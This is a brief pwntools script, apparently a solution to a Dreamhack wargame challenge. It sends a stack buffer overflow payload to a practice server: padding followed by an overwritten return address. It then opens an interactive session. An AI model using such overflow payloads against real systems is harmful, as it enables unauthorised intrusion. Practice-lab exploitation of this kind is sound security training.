from pwn import *
context.arch = 'amd64'
p = remote("host1.dreamhack.games",23801)
shellcode=b'A'*0x30 + b'B'*0x8+ b"\xaa\x06\x40\x00\x00\x00\x00\x00"
p.sendlineafter('Input: ',shellcode)
p.interactive()